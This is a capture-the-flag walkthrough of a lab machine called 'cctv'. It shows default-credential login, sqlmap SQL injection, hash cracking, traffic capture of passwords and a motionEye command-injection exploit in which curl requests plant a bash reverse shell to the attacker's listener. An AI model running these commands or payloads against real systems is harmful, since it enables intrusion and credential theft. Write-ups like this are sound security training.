## Intro

![](MediaFiles/Pasted%20image%2020260308195437.png)
Tags: #linux #WebApp #DefaultCreds #SQL-injection #PortForwarding #CaptureTraffic #3rd-party-vuln-app #easy

--------
# Reconnaissance

add target to hosts
```shell
echo '10.129.4.75 cctv.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  cctv.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 15:33 UTC
Nmap scan report for cctv.htb (10.129.4.75)
Host is up (0.052s latency).
Not shown: 59568 closed tcp ports (reset), 5965 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
```
According to these open ports, like port 88 for example its clear that the target is a DC

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A cctv.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 15:34 UTC
Nmap scan report for cctv.htb (10.129.4.75)
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   47.16 ms 10.10.14.1
2   47.56 ms cctv.htb (10.129.4.75)

OS and Service detection performed. Please report any incor
```

found `/zm` on page source
```shell
http://cctv.htb/zm
```
goes on login page, logged in with default creds 
## Admin page login via default creds
```
admin
admin
```
on filters page found `User to run filter as` and inside there is also a user called `mark`

------
# Foothold

## Vulnerable webApp version
```bash
curl -s http://cctv.htb/zm/api/host/getVersion.json \
  --cookie "ZMSESSID=<your_cookie>" | jq
```

```json
{
  "version": "1.37.63",
  "apiversion": "2.0"
}
```
**ZoneMinder 1.37.63**, and by googling it reveals [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482)
### SQL injection

-> TODO exploit sql injection manually

found this about zoneminder https://www.exploit-db.com/exploits/41239

so used sqlmap to list tables:
since its time based blind , it will be slow:
```shell
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --dbms=MySQL -D zm --tables --cookie="ZMSESSID=n3tohb1n3tmp14u53dqrdqd5j8" -p tid --technique=T --threads 20
```

#### Dumping creds

Dumping password of user mark
```shell
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' --cookie="ZMSESSID=23hr1occo60vbl1h1esi14p8qq" --sql-query="SELECT Password FROM zm.Users WHERE Username='mark'" --batch --time-sec=5
```
#### hash obtained
```
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```

### Cracking hash

```shell
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
```
cracked successfully
```shell
$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
```
#### creds obrained
```
mark
opensesame
```

## Shell as mark
```shell
└─$ ssh mark@cctv.htb                                                                            
The authenticity of host 'cctv.htb (10.129.4.75)' can't be established.
ED25519 key fingerprint is: SHA256:KrrHjS+nu1wJEfv1/NxT1fI+ODJaSRdJtFg201G+tO0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cctv.htb' (ED25519) to the list of known hosts.
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun  8 Mar 16:48:55 UTC 2026

  System load:           0.08
  Usage of /:            74.4% of 8.70GB
  Memory usage:          32%
  Swap usage:            0%
  Processes:             260
  Users logged in:       0
  IPv4 address for eth0: 10.129.4.75
  IPv6 address for eth0: dead:beef::250:56ff:fe94:6e89

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

14 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

mark@cctv:~$ whoami
mark
mark@cctv:~$ hostname
cctv
```
but no user flag found there, hmm

### sudo -l 

```shell
mark@cctv:~$ sudo -l
[sudo] password for mark: 
Sorry, user mark may not run sudo on cctv.
mark@cctv:~$ 
```
failed

### Listening ports

```shell
mark@cctv:~$ ss -tuln
Netid   State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process   
udp     UNCONN    0         0               127.0.0.54:53               0.0.0.0:*                
udp     UNCONN    0         0            127.0.0.53%lo:53               0.0.0.0:*                
udp     UNCONN    0         0                  0.0.0.0:68               0.0.0.0:*                
tcp     LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*                
tcp     LISTEN    0         4096             127.0.0.1:1935             0.0.0.0:*                
tcp     LISTEN    0         4096             127.0.0.1:7999             0.0.0.0:*                
tcp     LISTEN    0         4096               0.0.0.0:22               0.0.0.0:*                
tcp     LISTEN    0         4096            127.0.0.54:53               0.0.0.0:*                
tcp     LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                
tcp     LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*                
tcp     LISTEN    0         4096             127.0.0.1:8554             0.0.0.0:*                
tcp     LISTEN    0         4096             127.0.0.1:9081             0.0.0.0:*                
tcp     LISTEN    0         4096             127.0.0.1:8888             0.0.0.0:*                
tcp     LISTEN    0         128              127.0.0.1:8765             0.0.0.0:*                
tcp     LISTEN    0         511                      *:80                     *:*                
tcp     LISTEN    0         4096                  [::]:22                  [::]:*                
mark@cctv:~$ 
```

### File enumeration

```shell
mark@cctv:/tmp$ ls
MotionEye
snap-private-tmp
systemd-private-013e1b055f8c419783c4f8d6ead11193-apache2.service-x60wk0
systemd-private-013e1b055f8c419783c4f8d6ead11193-fwupd.service-omwLEd
systemd-private-013e1b055f8c419783c4f8d6ead11193-ModemManager.service-Mh0g8n
systemd-private-013e1b055f8c419783c4f8d6ead11193-polkit.service-oPLuwu
systemd-private-013e1b055f8c419783c4f8d6ead11193-systemd-logind.service-TI01pu
systemd-private-013e1b055f8c419783c4f8d6ead11193-systemd-resolved.service-yy617M
systemd-private-013e1b055f8c419783c4f8d6ead11193-systemd-timesyncd.service-P94nmV
systemd-private-013e1b055f8c419783c4f8d6ead11193-upower.service-Lv7x3M
vmware-root_647-3988163046
zm
```
hm `MotionEye` seems weird, lets look at it online, lets see if we can find anything associated with it
```shell
systemctl list-units --type=service --all | grep -i motion
```
### 3rd party app Found (motionEye)
```shell
mark@cctv:/tmp$ systemctl list-units --type=service --all | grep -i motion
  motioneye.service                        loaded    active   running motionEye Server
```
now we need to understand in what port does this run.

Online i found that motioneye typically uses port `8765` !
and i also confirmed it inside the machine
```shell
mark@cctv:/etc/motioneye$ cat motioneye.conf | grep port
# the TCP port to listen on
port 8765
```
also found this one `motion.conf`
```shell
mark@cctv:/etc/motioneye$ cat motion.conf 
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 


setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2

camera camera-1.conf
```
#### creds obtained
```
admin
989c5a8ee87a0e9521ec81a79187d162109282f0
```

### Port forward

```shell
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

navigating to the webpage we forwarded shows the `motionEye` login page
![](MediaFiles/Pasted%20image%2020260928211721.png)

### ifconfig

```shell
mark@cctv:~$ ifconfig
br-1b6b4b93c636: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.25.0.1  netmask 255.255.0.0  broadcast 172.25.255.255
        inet6 fe80::bcbe:4bff:fee4:7f31  prefixlen 64  scopeid 0x20<link>
        ether be:be:4b:e4:7f:31  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

br-3e74116c4022: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::280a:a7ff:fea4:dfba  prefixlen 64  scopeid 0x20<link>
        ether 2a:0a:a7:a4:df:ba  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 0e:24:e6:c4:cc:81  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.4.75  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:fe94:6e89  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:fe94:6e89  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:6e:89  txqueuelen 1000  (Ethernet)
        RX packets 1412190  bytes 87898250 (87.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 358429  bytes 20090486 (20.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10672  bytes 4827998 (4.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10672  bytes 4827998 (4.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth8735592: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::a050:e3ff:fe5b:3e84  prefixlen 64  scopeid 0x20<link>
        ether a2:50:e3:5b:3e:84  txqueuelen 0  (Ethernet)
        RX packets 88513  bytes 15321763 (15.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 86733  bytes 25734692 (25.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth20a27a5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::d43f:23ff:fe8b:f4a3  prefixlen 64  scopeid 0x20<link>
        ether d6:3f:23:8b:f4:a3  txqueuelen 0  (Ethernet)
        RX packets 60428  bytes 23983443 (23.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 60355  bytes 3980047 (3.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth3072d4e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::90a0:50ff:fe50:946e  prefixlen 64  scopeid 0x20<link>
        ether 92:a0:50:50:94:6e  txqueuelen 0  (Ethernet)
        RX packets 774  bytes 51645 (51.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 900  bytes 62525 (62.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth434daac: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::4c4f:e8ff:fed0:47c7  prefixlen 64  scopeid 0x20<link>
        ether 4e:4f:e8:d0:47:c7  txqueuelen 0  (Ethernet)
        RX packets 882  bytes 61045 (61.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 795  bytes 53387 (53.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
### Capture traffic

```shell
/usr/bin/tcpdump -i any net 172.25.0.0/24 -w /tmp/capture.pcap
```
found creds inside the capture
```shell
�̴|���USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-infoٲ�iZ��|����E41L@@�0�
```
#### creds obtained
```
sa_mark
X1l9fx1ZjS7RZb
```

## Shell as sa_mark

change user, and stabilize:
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
grab user flag
```shell
sa_mark@cctv:~$ ls
'SecureVision Staff Announcement.pdf'   user.txt
sa_mark@cctv:~$ cat user.txt
37a876d43064feb38fdd51c0df49ed10
```
transfer the pdf file to attacker:
target
```shell
python3 -m http.server 8001
```
attacker
```shell
wget http://cctv.htb:8001/'SecureVision Staff Announcement.pdf'
```
or
```shell
sshpass -p 'X1l9fx1ZjS7RZb' scp sa_mark@cctv.htb:~/*.pdf .
```
by opening it i did not find anything i didnt already know, lets move on

-------
# Privesc

### sudo -l

failed
```shell
sa_mark@cctv:~$ sudo -l
[sudo] password for sa_mark: 
Sorry, user sa_mark may not run sudo on cctv.
```
lets move on with what we found about `motioneye`

## Exploiting 3rd party app (motionEye)

via metasploit, it didnt work
```shell
msf > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787

[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > 
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set rport 8765
rport => 8765
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > 
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set PASSWORD 989c5a8ee87a0e9521ec81a79187d162109282f0
PASSWORD => 989c5a8ee87a0e9521ec81a79187d162109282f0
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > set lhost 10.10.15.0
lhost => 10.10.15.0
msf exploit(linux/http/motioneye_auth_rce_cve_2025_60787) > exploit
```

### CVE-2025-60787
Found this that worked
https://github.com/gunzf0x/CVE-2025-60787

Found also this online: https://github.com/advisories/GHSA-j945-qm58-4gjx

```shell
curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"
curl -s "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.0%2F3333%200%3E%261%27%29"
curl -s "http://127.0.0.1:7999/1/config/set?emulate_motion=on"
curl -s "http://127.0.0.1:7999/1/action/snapshot"
```
## Shell as root
```shell
└─$ nc -lvnp 3333                                                                   
listening on [any] 3333 ...
connect to [10.10.15.0] from (UNKNOWN) [10.129.4.75] 37874
bash: cannot set terminal process group (5311): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# whoami
whoami
root
root@cctv:~# cat root.txt
cat root.txt
ad56c565292ed4e73e229fa7edc56ce2
```


--------
# Summary













---
# Sidenotes





![](MediaFiles/Pasted%20image%2020260308195359.png)